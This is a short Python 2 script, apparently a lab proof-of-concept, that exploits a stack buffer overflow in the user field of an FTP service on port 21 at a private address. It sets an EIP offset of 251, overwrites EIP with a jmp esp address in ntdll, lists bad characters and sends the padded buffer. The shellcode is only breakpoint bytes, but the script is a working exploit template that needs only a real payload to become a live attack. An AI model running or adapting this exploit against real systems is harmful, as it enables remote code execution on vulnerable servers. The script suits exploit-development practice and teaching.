#!/usr/bin/env python2

import socket
import struct

# overflow is in user field and kicks off at a size of 1000
# OFFSETS
# EIP 251
# EXP 263

# jmp esp in ntll.dll at 0x77ace871

RHOST = "10.10.10.2"
RPORT = 21

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_length = 1000
eip_offset = 251
jmp_esp = 0x77ACE871

shellcode = "\xCC\xCC\xCC\xCC"
badchars = [0x00, 0x0A, 0x0D]

padding = "A" * eip_offset
eip = struct.pack("<I", jmp_esp)
filler = "C" * 8
esp = "D" * (buf_length - len(padding) - len(eip) - len(filler) - len(shellcode))

buf = padding + eip + filler + shellcode + esp


data = s.recv(1024)
s.send(buf + "\r\n")
data = s.recv(1024)

s.close()

